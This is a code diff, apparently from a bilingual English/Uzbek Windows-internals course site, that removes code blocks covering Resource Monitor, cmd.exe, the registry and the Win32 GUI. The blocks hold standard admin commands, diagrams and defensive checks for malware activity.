-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Alohida snap-inlarni ochish
-compmgmt.msc   lusrmgr.msc   diskmgmt.msc   services.msc
-perfmon.msc    wmimgmt.msc   eventvwr.msc   taskschd.msc
-
-# Barcha tarmoq ulashimlarini ko'rish
-Get-SmbShare | Select-Object Name, Path, Description
-net share
-
-# Faol SMB sessiyalari
-Get-SmbSession | Select-Object ClientComputerName, ClientUserName, NumOpens
-net session
-
-# Ulashimlardagi ochiq fayllar
-Get-SmbOpenFile | Select-Object SessionId, ClientUserName, Path
-
-# WMI persistenslikni aniqlash
-Get-WMIObject -Namespace "root\\subscription" -Class "__EventFilter"
-Get-WMIObject -Namespace "root\\subscription" -Class "__EventConsumer"
-Get-WMIObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding"
-
-# Disk ma'lumotlari
-Get-Disk; Get-Partition; Get-Volume`}</code></pre>
     </section>
   );
 }
@@ -10000,25 +8288,6 @@ function SectionResourceMonitor() {
       </Callout>
 
       {/* Architecture diagram */}
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:14}}><code>{`Resource Monitor Layout:
-┌─────────────────────────────────────────────────────────────────────────┐
-│  [Overview]  [CPU]  [Memory]  [Disk]  [Network]          ← 5 tabs      │
-├─────────────────────────────────────────────┬───────────────────────────┤
-│                                             │  Real-time Graphs Panel   │
-│  Overview tab: 4 collapsible sections       │  ┌─────────────────────┐  │
-│  ┌─ CPU ──────────────────────────────────┐ │  │ CPU Total   ██░░░░  │  │
-│  │  Image  PID  Desc  Status  Threads CPU │ │  │             45%     │  │
-│  └────────────────────────────────────────┘ │  ├─────────────────────┤  │
-│  ┌─ Disk ─────────────────────────────────┐ │  │ Disk I/O    ████░░  │  │
-│  │  Image  PID  File   R B/s   W B/s  Pri │ │  │             2.1 MB/s│  │
-│  └────────────────────────────────────────┘ │  ├─────────────────────┤  │
-│  ┌─ Network ──────────────────────────────┐ │  │ Network     █░░░░░  │  │
-│  │  Image  PID  Address  Send  Receive    │ │  │             120 Kbps│  │
-│  └────────────────────────────────────────┘ │  ├─────────────────────┤  │
-│  ┌─ Memory ───────────────────────────────┐ │  │ Memory      ██████  │  │
-│  │  Image  PID  Hard Faults  Working Set  │ │  │  Used: 6.2 GB       │  │
-│  └────────────────────────────────────────┘ │  └─────────────────────┘  │
-└─────────────────────────────────────────────┴───────────────────────────┘`}</code></pre>
 
       <H2 num="§2" en="CPU Tab" uz="" />
       <P>The <Term>CPU tab</Term> shows every process consuming CPU cycles and breaks down activity into 4 sub-tables: Processes, Services, Associated Handles, and Associated Modules.</P>
@@ -10038,29 +8307,6 @@ function SectionResourceMonitor() {
 
       <H2 num="§3" en="Memory Tab" uz="" />
       <P>The <Term>Memory tab</Term> shows per-process RAM usage and a physical memory bar at the bottom that maps how RAM is currently divided.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Memory Tab Columns:
-  Image      → process name
-  PID        → process ID
-  Hard Faults/sec → page faults requiring disk access (high = memory pressure)
-  Commit (KB) → virtual memory committed (may exceed physical RAM)
-  Working Set (KB) → pages currently in physical RAM (resident set)
-  Shareable (KB)   → pages shared with other processes (e.g., mapped DLLs)
-  Private (KB)     → pages exclusive to this process (not shareable)
-
-Physical Memory Bar (bottom):
-  ┌────────────────────────────────────────────────────────┐
-  │ In Use │ Modified │ Standby │ Free                     │
-  └────────────────────────────────────────────────────────┘
-  In Use    → actively used by processes + system
-  Modified  → dirty pages waiting to be written to disk
-  Standby   → cached (recently used, available if needed)
-  Free      → zeroed pages, immediately available
-
-Security relevance:
-  Private Working Set = pages only the process uses
-  High private commit for an unknown process → suspicious
-  Hard Faults spike → system swapping to pagefile (memory pressure / forensic)
-  Committed > Physical RAM → heavy paging → check pagefile.sys for artifacts`}</code></pre>
 
       <H2 num="§4" en="Disk Tab" uz="" />
       <P>The <Term>Disk tab</Term> shows real-time file I/O per process — which files are being read/written and at what speed. It is the fastest way to find what process is hammering the disk.</P>
@@ -10086,47 +8332,12 @@ Security relevance:
 
       <H2 num="§5" en="Network Tab" uz="" />
       <P>The <Term>Network tab</Term> shows active network connections per process — the most useful tab for detecting malware command-and-control traffic and unauthorized connections.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Network Tab — 3 sub-tables:
-
-1. Processes with Network Activity
-   Image | PID | Send B/sec | Receive B/sec | Total B/sec
-   → Sort by Total to find highest bandwidth consumers
-
-2. Network Activity (per connection)
-   Image | PID | Address | Send B/sec | Receive B/sec
-   → See exact remote IPs each process is talking to
-
-3. TCP Connections
-   Image | PID | Local Address:Port | Remote Address:Port | Packet Loss | Latency
-   → Full socket table — equivalent to netstat -ano but with process name
-
-4. Listening Ports
-   Image | PID | Address | Port | Protocol
-   → All open ports (TCP + UDP) with owning process
-   → Critical: find unexpected listener on high port = backdoor indicator
-
-Security checks:
-  Unknown process with outbound connection to unusual IP → C2 beacon
-  Listener on unexpected port (not 80/443/445/3389) → backdoor
-  svchost.exe connecting to external IP → malicious service
-  Process sending more than receiving → data exfiltration`}</code></pre>
 
       <H2 num="§6" en="Command Prompt — cmd.exe" uz="" />
       <P>
         <Term>cmd.exe</Term> (Command Prompt) was the primary interface for early Windows systems before GUI. It remains essential for administration, automation, and security tasks.
         While PowerShell has largely replaced cmd for advanced tasks, cmd.exe is universally available and lighter.
       </P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Getting help for any command:
-  <command> /?         → show syntax and parameters
-  ipconfig /?          → ipconfig help
-  netstat /?           → netstat help
-
-  Exception: net commands use a different syntax:
-  net help             → list net subcommands
-  net help user        → help for 'net user'
-  net help localgroup  → help for 'net localgroup'
-
-Clear the screen: cls`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>Essential Commands</h3>
       <div style={{overflowX:"auto",marginTop:10}}>
@@ -10159,62 +8370,8 @@ Clear the screen: cls`}</code></pre>
       <P>
         <Term>regedit.exe</Term> is the GUI editor for the Windows Registry — the central hierarchical database storing settings for users, applications, and hardware. Windows constantly reads the registry during operation. A full treatment is in <Em>L08 — Windows Registry</Em>; here is the quick reference for tools accessible from msconfig.
       </P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Registry stores:
-  → Per-user profiles
-  → Installed applications and document type associations
-  → Folder and icon properties
-  → Hardware inventory
-  → Used COM ports and devices
-
-Open: Run → regedit   (requires UAC elevation for HKLM writes)
-
-WARNING: Registry edits can break normal system operation.
-         Always export a key before modifying it:
-         File → Export → save .reg backup
-
-Root keys (hives):
-  HKLM  → machine-wide settings (all users)
-  HKCU  → current user settings
-  HKCR  → file type / COM class associations
-  HKU   → all users' hives
-  HKCC  → current hardware profile
-
-Security relevance:
-  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  → auto-start (all users)
-  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  → auto-start (current user)
-  HKLM\\SYSTEM\\CurrentControlSet\\Services                → service definitions`}</code></pre>
 
       <H2 num="§8" en="Practical Commands" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Open Resource Monitor
-resmon
-# From Task Manager: Performance tab → "Open Resource Monitor"
-
-# Find process using a specific file (Handle search in Resource Monitor)
-# CPU tab → Associated Handles → search box
-
-# netstat quick cheatsheet
-netstat -a        # all connections + listening ports
-netstat -n        # numeric IPs (no DNS resolution — faster)
-netstat -o        # show owning PID
-netstat -b        # show owning process name (requires admin)
-netstat -ano      # all + numeric + PID  ← most useful
-netstat -e        # Ethernet statistics (bytes/packets/errors)
-
-# Find process owning a port (combine with tasklist)
-netstat -ano | findstr ":443 "
-tasklist /fi "PID eq 1234"
-
-# User and share enumeration
-net user                         # list local users
-net user Administrator           # details on specific account
-net localgroup                   # list all groups
-net localgroup Administrators    # members of Administrators
-net share                        # list all shares
-net session                      # active SMB sessions
-
-# Quick system info
-systeminfo                       # full OS, RAM, hotfixes, network adapters
-systeminfo | findstr /B /C:"OS" /C:"System Boot"`}</code></pre>
     </section>
   ) : (
     <section>
@@ -10227,26 +8384,6 @@ systeminfo | findstr /B /C:"OS" /C:"System Boot"`}</code></pre>
       <Callout color="var(--accent)" icon="info" titleUz="Qanday ochish" titleEn="">
         Run → <code>resmon</code> · Vazifa menejeri → Ishlash tab → "Resurs monitorini ochish" · msconfig Vositalar tab → Resource Monitor → Ishga tushirish · Boshlash menyu → "Resource Monitor" qidirish
       </Callout>
-
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:14}}><code>{`Resource Monitor Tartibi:
-┌─────────────────────────────────────────────────────────────────────────┐
-│  [Umumiy]  [CPU]  [Xotira]  [Disk]  [Tarmoq]            ← 5 tab       │
-├─────────────────────────────────────────────┬───────────────────────────┤
-│                                             │  Real vaqt grafiklari     │
-│  Umumiy tab: 4 ta kengaytiriluvchi bo'lim   │  ┌─────────────────────┐  │
-│  ┌─ CPU ──────────────────────────────────┐ │  │ CPU Jami    ██░░░░  │  │
-│  │  Nom  PID  Tavsif  Holat  Thread  CPU  │ │  │             45%     │  │
-│  └────────────────────────────────────────┘ │  ├─────────────────────┤  │
-│  ┌─ Disk ─────────────────────────────────┐ │  │ Disk I/O    ████░░  │  │
-│  │  Nom  PID  Fayl   O'qish   Yozish  Pri │ │  │             2.1 MB/s│  │
-│  └────────────────────────────────────────┘ │  ├─────────────────────┤  │
-│  ┌─ Tarmoq ────────────────────────────────┐│  │ Tarmoq      █░░░░░  │  │
-│  │  Nom  PID  Manzil  Yuborish  Qabul      ││  │             120 Kbps│  │
-│  └────────────────────────────────────────┘ │  ├─────────────────────┤  │
-│  ┌─ Xotira ───────────────────────────────┐ │  │ Xotira      ██████  │  │
-│  │  Nom  PID  Qattiq Xatolar  Ishlash To'p│ │  │  Ishlatilgan: 6.2 GB│  │
-│  └────────────────────────────────────────┘ │  └─────────────────────┘  │
-└─────────────────────────────────────────────┴───────────────────────────┘`}</code></pre>
 
       <H2 num="§2" uz="CPU Tab" en="" />
       <P><Term>CPU tab</Term> CPU tsikllarini iste'mol qilayotgan barcha jarayonlarni ko'rsatadi va faoliyatni 4 ta kichik jadvalga ajratadi: Jarayonlar, Xizmatlar, Bog'liq Deskriptorlar va Bog'liq Modullar.</P>
@@ -10266,27 +8403,6 @@ systeminfo | findstr /B /C:"OS" /C:"System Boot"`}</code></pre>
 
       <H2 num="§3" uz="Memory Tab" en="" />
       <P><Term>Memory tab</Term> jarayon boshiga RAM iste'molini va pastdagi jismoniy xotira panelini ko'rsatadi — RAM qanday taqsimlanganini xaritasini chizadi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Memory Tab Ustunlari:
-  Nom           → jarayon nomi
-  PID           → jarayon ID
-  Qattiq Xatolar/s → diskga murojaat talab qiluvchi sahifa xatolari (yuqori = xotira bosimi)
-  Majburiy (KB) → majburlangan virtual xotira (jismoniy RAM dan oshishi mumkin)
-  Ishlash To'p (KB) → jismoniy RAM dagi sahifalar (rezident to'p)
-  Umumlashtirilgan (KB) → boshqa jarayonlar bilan ulashilgan sahifalar (masalan, DLL lar)
-  Shaxsiy (KB)  → faqat ushbu jarayonga tegishli sahifalar
-
-Jismoniy Xotira Paneli (pastda):
-  ┌────────────────────────────────────────────────────────┐
-  │ Ishlatilmoqda │ O'zgartirilgan │ Standby │ Bo'sh       │
-  └────────────────────────────────────────────────────────┘
-  Ishlatilmoqda  → jarayonlar + tizim tomonidan faol ishlatilmoqda
-  O'zgartirilgan → diskka yozilishini kutayotgan iflos sahifalar
-  Standby        → keshlangan (so'nggi ishlatilgan, zarur bo'lganda mavjud)
-  Bo'sh          → nollangan sahifalar, darhol mavjud
-
-Xavfsizlik ahamiyati:
-  Noma'lum jarayon uchun yuqori shaxsiy majburiy → shubhali
-  Qattiq Xatolar o'sishi → tizim pagefile ga almashmoqda → artefaktlar uchun tekshiring`}</code></pre>
 
       <H2 num="§4" uz="Disk Tab" en="" />
       <P><Term>Disk tab</Term> jarayon boshiga real vaqt fayl I/O ni ko'rsatadi — qaysi fayllar o'qilmoqda/yozilmoqda va qanday tezlikda. Diskni eng ko'p ishlatayotgan jarayonni topishning eng tez usuli.</P>
@@ -10312,47 +8428,12 @@ Xavfsizlik ahamiyati:
 
       <H2 num="§5" uz="Network Tab" en="" />
       <P><Term>Network tab</Term> jarayon boshiga faol tarmoq ulanishlarini ko'rsatadi — zararli dastur C2 trafigini va ruxsatsiz ulanishlarni aniqlash uchun eng foydali tab.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Network Tab — 4 ta kichik jadval:
-
-1. Tarmoq faoliyatiga ega jarayonlar
-   Nom | PID | Yuborish B/s | Qabul B/s | Jami B/s
-   → Eng ko'p tarmoq iste'mol qiluvchini topish uchun Jami bo'yicha saralang
-
-2. Tarmoq faoliyati (ulanish boshiga)
-   Nom | PID | Manzil | Yuborish B/s | Qabul B/s
-   → Har bir jarayon qaysi masofaviy IP bilan gaplashayotganini ko'ring
-
-3. TCP Ulanishlari
-   Nom | PID | Mahalliy Manzil:Port | Masofaviy Manzil:Port | Paket yo'qotish | Kechikish
-   → Jarayon nomi bilan to'liq soket jadvali — netstat -ano ekvivalenti
-
-4. Tinglash Portlari
-   Nom | PID | Manzil | Port | Protokol
-   → Jarayon egaligi bilan barcha ochiq portlar (TCP + UDP)
-   → Kritik: kutilmagan baland portdagi tinglovchi = backdoor ko'rsatgich
-
-Xavfsizlik tekshiruvlari:
-  G'ayrioddiy IP ga chiquvchi ulanishli noma'lum jarayon → C2 mayoqi
-  Kutilmagan portdagi tinglovchi (80/443/445/3389 emas) → backdoor
-  Tashqi IP ga ulanayotgan svchost.exe → zararli xizmat
-  Jarayon qabul qilishdan ko'ra ko'proq yuborayotgan → ma'lumot eksfiltratsiyasi`}</code></pre>
 
       <H2 num="§6" uz="Buyruqlar Satri — cmd.exe" en="" />
       <P>
         <Term>cmd.exe</Term> (Buyruqlar Satri) GUI joriy etilishidan oldin dastlabki Windows tizimlarining asosiy interfeysi bo'lgan.
         PowerShell ilg'or vazifalar uchun cmd ni asosan almashtirgan bo'lsa-da, cmd.exe hamma joyda mavjud va engil.
       </P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Istalgan buyruq uchun yordam olish:
-  <buyruq> /?       → sintaksis va parametrlarni ko'rsatish
-  ipconfig /?       → ipconfig yordami
-  netstat /?        → netstat yordami
-
-  Istisno: net buyruqlari boshqa sintaksisdan foydalanadi:
-  net help          → net buyruqlarini ro'yxatga olish
-  net help user     → 'net user' uchun yordam
-  net help localgroup → 'net localgroup' uchun yordam
-
-Ekranni tozalash: cls`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>Asosiy Buyruqlar</h3>
       <div style={{overflowX:"auto",marginTop:10}}>
@@ -10384,59 +8465,8 @@ Ekranni tozalash: cls`}</code></pre>
       <P>
         <Term>regedit.exe</Term> — Windows Registry (foydalanuvchilar, ilovalar va apparat uchun sozlamalarni saqlaydigan markaziy ierarxik ma'lumotlar bazasi) ni grafik muharrir. To'liq ko'rib chiqish <Em>L08 — Windows Registry</Em> da; bu yerda msconfig orqali kirish mumkin bo'lgan vosita sifatida tezkor ma'lumotnoma.
       </P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Registry nima saqlaydi:
-  → Har bir foydalanuvchi uchun profillar
-  → O'rnatilgan ilovalar va hujjat turi assotsiatsiyalari
-  → Papka va piktogramma (icon) xususiyatlari
-  → Apparat inventarizatsiyasi
-  → Ishlatilgan COM portlari va qurilmalar
-
-Ochish: Run → regedit  (HKLM yozishi uchun UAC kerak)
-
-OGOHLANTIRISH: Registry tahrirlari tizimning oddiy ishlashiga ta'sir qilishi mumkin.
-               O'zgartirishdan oldin har doim kalitni eksport qiling:
-               Fayl → Eksport → .reg zaxira saqla
-
-Asosiy kalitlar (hive):
-  HKLM  → mashina bo'yicha sozlamalar (barcha foydalanuvchilar)
-  HKCU  → joriy foydalanuvchi sozlamalari
-  HKCR  → fayl turi / COM klass assotsiatsiyalari
-  HKU   → barcha foydalanuvchilar hive lari
-  HKCC  → joriy apparat profili
-
-Xavfsizlik ahamiyati:
-  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  → avto-ishga tushirish (barcha foydalanuvchilar)
-  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  → avto-ishga tushirish (joriy foydalanuvchi)
-  HKLM\\SYSTEM\\CurrentControlSet\\Services               → xizmat ta'riflari`}</code></pre>
 
       <H2 num="§8" uz="Amaliy Buyruqlar" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Resource Monitor ochish
-resmon
-# Vazifa menejeri → Ishlash tab → "Resurs monitorini ochish"
-
-# netstat tezkor lug'at
-netstat -a        # barcha ulanishlar + tinglash portlari
-netstat -n        # raqamli IP (DNS aniqlashsiz — tezroq)
-netstat -o        # egasi PID ni ko'rsatish
-netstat -b        # egasi jarayon nomini ko'rsatish (admin talab qiladi)
-netstat -ano      # barcha + raqamli + PID  ← eng foydali
-netstat -e        # Ethernet statistikasi
-
-# Portga egalik qiluvchi jarayonni topish
-netstat -ano | findstr ":443 "
-tasklist /fi "PID eq 1234"
-
-# Foydalanuvchi va ulashim ro'yxati
-net user                         # mahalliy foydalanuvchilar ro'yxati
-net user Administrator           # muayyan hisob haqida tafsilotlar
-net localgroup                   # barcha guruhlar
-net localgroup Administrators    # Administratorlar a'zolari
-net share                        # barcha ulashimlar
-net session                      # faol SMB sessiyalari
-
-# Tizim ma'lumotlari
-systeminfo                       # to'liq OS, RAM, hotfix, tarmoq adapterlari
-systeminfo | findstr /B /C:"OS" /C:"System Boot"`}</code></pre>
     </section>
   );
 }
@@ -10449,27 +8479,6 @@ function SectionGUI() {
     <section>
       <H2 num="§1" en="Windows GUI Architecture" uz="" />
       <P>The Windows <Term>Graphical User Interface</Term> is built on the Win32 window model, a client/server architecture where user-mode applications send messages to windows, and the kernel (win32k.sys) routes those messages. Every visible element — dialog boxes, buttons, menus, title bars — is a <Term>window</Term> with a unique handle (HWND).</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.8,overflowX:"auto",marginTop:12}}><code>{`┌─────────────────────────────────────────────────────────────┐
-│                    USER SPACE                               │
-│  ┌──────────────────────────────────────────────────────┐  │
-│  │  Application (explorer.exe, notepad.exe, etc.)       │  │
-│  │   │ CreateWindow() → HWND                            │  │
-│  │   │ SendMessage() / PostMessage()                    │  │
-│  │   │ WndProc (message handler callback)               │  │
-│  └──────────────────────┬───────────────────────────────┘  │
-│                         │  user32.dll / gdi32.dll           │
-└─────────────────────────┼───────────────────────────────────┘
-                          │  system call (NtUserXxx)
-┌─────────────────────────▼───────────────────────────────────┐
-│                  KERNEL SPACE                               │
-│   win32k.sys  ──  Window Manager (USER)                    │
-│                ──  Graphics Device Interface (GDI)          │
-│   DWM (dwm.exe, user-mode compositor) ◄── DirectX/DXGI     │
-│   ┌──────────┐  ┌──────────┐  ┌──────────┐                │
-│   │ Display  │  │ Input    │  │ Desktop  │                 │
-│   │ Driver   │  │ (HID)    │  │ Heap     │                 │
-│   └──────────┘  └──────────┘  └──────────┘                │
-└─────────────────────────────────────────────────────────────┘`}</code></pre>
 
       <H2 num="§2" en="Win32 Window Model — HWND and WndProc" uz="" />
       <P>Every window is identified by an <Term>HWND (Handle to Window)</Term>. When you call <code>CreateWindowEx()</code>, the OS registers the window and returns an HWND. Each window class registers a <Term>WndProc (Window Procedure)</Term> — a callback function that receives and processes messages.</P>
@@ -10488,27 +8497,6 @@ function SectionGUI() {
       </div>
 
       <H2 num="§3" en="Desktop, Taskbar & Start Menu Anatomy" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.8,overflowX:"auto",marginTop:12}}><code>{`Windows Desktop Hierarchy:
-─────────────────────────────────────────────────────────────
-Window Station (WinSta0)  — security boundary; interactive
-  └─ Desktop Object (Default)  — HWND tree root
-       ├─ Shell_TrayWnd          (Taskbar — explorer.exe)
-       │    ├─ Start button      (opens StartMenuExperienceHost.exe)
-       │    ├─ Taskbar buttons   (running apps)
-       │    ├─ System Tray       (notification icons, clock)
-       │    └─ Action Center     (Quick Settings panel)
-       ├─ WorkerW                (Desktop icon renderer)
-       ├─ Progman               (Program Manager — desktop root)
-       │    └─ SHELLDLL_DefView  (desktop icon ListView)
-       └─ Application Windows   (all user apps)
-
-Key Processes:
-  explorer.exe       Shell, file manager, desktop/taskbar
-  dwm.exe            DWM compositor (all visual rendering)
-  sihost.exe         Shell Infrastructure Host (Start Menu support)
-  StartMenuExperienceHost.exe  WinUI Start Menu
-  SearchHost.exe     Search UI (Cortana replacement)
-  RuntimeBroker.exe  Permission broker for UWP apps`}</code></pre>
 
       <H2 num="§4" en="DWM — Desktop Window Manager" uz="" />
       <P><Term>DWM (Desktop Window Manager)</Term> is the compositor process (dwm.exe) introduced in Windows Vista. Instead of apps drawing directly to the screen, each window renders into an off-screen Direct3D surface. DWM composites all surfaces and sends the final frame to the display — enabling transparency (Aero Glass), animations, thumbnail previews, HDR, and per-monitor DPI scaling.</P>
@@ -10549,28 +8537,6 @@ Key Processes:
       </div>
 
       <H2 num="§6" en="Win32 Messages — Key WM_ Constants" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.9,overflowX:"auto",marginTop:10}}><code>{`// Input messages
-WM_KEYDOWN / WM_KEYUP     0x0100 / 0x0101   Key pressed/released (virtual key code in wParam)
-WM_CHAR                   0x0102            Translated character (after TranslateMessage())
-WM_LBUTTONDOWN            0x0201            Left mouse button down (cursor pos in lParam)
-WM_RBUTTONDOWN            0x0204            Right mouse button down
-WM_MOUSEMOVE              0x0200            Mouse moved (cursor pos in lParam)
-WM_MOUSEWHEEL             0x020A            Mouse wheel scrolled (delta in HIWORD(wParam))
-
-// Window lifecycle
-WM_CREATE                 0x0001            Window created (CREATESTRUCT* in lParam)
-WM_DESTROY                0x0002            Window destroyed — post WM_QUIT here
-WM_CLOSE                  0x0010            User clicked X — can intercept to show "Save?" dialog
-WM_QUIT                   0x0012            Terminates message loop (GetMessage returns 0)
-WM_SIZE                   0x0005            Window resized (new size in lParam)
-WM_PAINT                  0x000F            Window needs repainting (use BeginPaint/EndPaint)
-
-// System messages
-WM_TIMER                  0x0113            Timer fired (SetTimer ID in wParam)
-WM_COMMAND                0x0111            Menu item / button clicked (control ID in wParam)
-WM_NOTIFY                 0x004E            Common control notification (NMHDR* in lParam)
-WM_COPYDATA               0x004A            Cross-process data transfer (COPYDATASTRUCT*)
-WM_HOTKEY                 0x0312            System-wide hotkey registered with RegisterHotKey()`}</code></pre>
 
       <H2 num="§7" en="GUI Security — Attack Vectors" uz="" />
       <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
@@ -10592,61 +8558,11 @@ WM_HOTKEY                 0x0312            System-wide hotkey registered with R
       </Callout>
 
       <H2 num="§8" en="Practical Commands" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Window enumeration (PowerShell)
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.Screen]::AllScreens           # monitor layout
-
-# Find window by title (.NET)
-Add-Type @"
-using System; using System.Runtime.InteropServices;
-public class Win32 {
-  [DllImport("user32.dll")] public static extern IntPtr FindWindow(string cls, string title);
-  [DllImport("user32.dll")] public static extern bool IsWindowVisible(IntPtr h);
-}
-"@
-[Win32]::FindWindow($null, "Notepad")               # HWND of Notepad window
-
-# DWM diagnostics
-Get-Process dwm                                     # DWM process info
-winver                                              # OS build (affects DWM features)
-
-# UI test / spy tools
-Spy++ (spyxx.exe)                                   # VS: enumerate windows, messages, classes
-Accessibility Insights                              # UIA tree viewer (free, Microsoft)
-inspect.exe (Windows SDK)                           # UIA element inspector
-
-# Check UIPI (Integrity Level of a process)
-Get-Process notepad | ForEach { icacls (Get-Process -Id $_.Id).Path }
-whoami /groups | findstr "Integrity"               # current process IL
-
-# List window stations and desktops
-Get-Process | Where {$_.MainWindowTitle -ne ""} | Select Name,Id,MainWindowTitle`}</code></pre>
     </section>
   ) : (
     <section>
       <H2 num="§1" uz="Windows GUI Arxitekturasi" en="" />
       <P>Windows <Term>Grafik Foydalanuvchi Interfeysi (GUI)</Term> Win32 oyna modeliga asoslangan — mijoz/server arxitekturasi bo'lib, foydalanuvchi-rejim ilovalari oynalarga xabarlar yuboradi va kernel (win32k.sys) bu xabarlarni yo'naltiradi. Har bir ko'rinadigan element — dialog oynalar, tugmalar, menyular, sarlavha satrlari — noyob tutqich (HWND) ga ega <Term>oyna</Term> hisoblanadi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.8,overflowX:"auto",marginTop:12}}><code>{`┌─────────────────────────────────────────────────────────────┐
-│                  FOYDALANUVCHI FAZOSI                       │
-│  ┌──────────────────────────────────────────────────────┐  │
-│  │  Ilova (explorer.exe, notepad.exe, va h.k.)          │  │
-│  │   │ CreateWindow() → HWND                            │  │
-│  │   │ SendMessage() / PostMessage()                    │  │
-│  │   │ WndProc (xabar ishlovchi callback)               │  │
-│  └──────────────────────┬───────────────────────────────┘  │
-│                         │  user32.dll / gdi32.dll           │
-└─────────────────────────┼───────────────────────────────────┘
-                          │  tizim chaqiruvi (NtUserXxx)
-┌─────────────────────────▼───────────────────────────────────┐
-│                   KERNEL FAZOSI                             │
-│   win32k.sys  ──  Oyna Menejeri (USER)                     │
-│                ──  Grafik Qurilma Interfeysi (GDI)          │
-│   DWM (dwm.exe, foydalanuvchi-rejim compositor) ◄── DirectX│
-│   ┌──────────┐  ┌──────────┐  ┌──────────┐                │
-│   │ Displey  │  │ Kirish   │  │ Ish stoli│                 │
-│   │ Drayveri │  │ (HID)    │  │ Yig'ini  │                 │
-│   └──────────┘  └──────────┘  └──────────┘                │
-└─────────────────────────────────────────────────────────────┘`}</code></pre>
 
       <H2 num="§2" uz="Win32 Oyna Modeli — HWND va WndProc" en="" />
       <P>Har bir oyna <Term>HWND (Oyna Tutqichi)</Term> bilan aniqlanadi. <code>CreateWindowEx()</code> chaqirilganda OS oynani ro'yxatdan o'tkazadi va HWND qaytaradi. Har bir oyna sinfi <Term>WndProc (Oyna Prosedurasi)</Term> — xabarlarni qabul qiladigan va qayta ishlaydigan callback funktsiyani ro'yxatdan o'tkazadi.</P>
@@ -10665,27 +8581,6 @@ Get-Process | Where {$_.MainWindowTitle -ne ""} | Select Name,Id,MainWindowTitle
       </div>
 
       <H2 num="§3" uz="Ish stoli, Vazifalar paneli va Start Menu Anatomiyasi" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.8,overflowX:"auto",marginTop:12}}><code>{`Windows Ish stoli Ierarxiyasi:
-─────────────────────────────────────────────────────────────
-Oyna Stantsiyasi (WinSta0)  — xavfsizlik chegarasi; interaktiv
-  └─ Ish stoli Ob'ekti (Default)  — HWND daraxt ildizi
-       ├─ Shell_TrayWnd          (Vazifalar paneli — explorer.exe)
-       │    ├─ Start tugmasi     (StartMenuExperienceHost.exe ochadi)
-       │    ├─ Vazifalar tugmalari (ishlaydigan ilovalar)
-       │    ├─ Tizim Paneli     (bildirishnoma ikonkalari, soat)
-       │    └─ Harakat Markazi  (Tezkor Sozlamalar paneli)
-       ├─ WorkerW               (Ish stoli ikona renderi)
-       ├─ Progman               (Dastur Menejeri — ish stoli ildizi)
-       │    └─ SHELLDLL_DefView  (ish stoli ikona ListView)
-       └─ Ilova Oynalari        (barcha foydalanuvchi ilovalari)
-
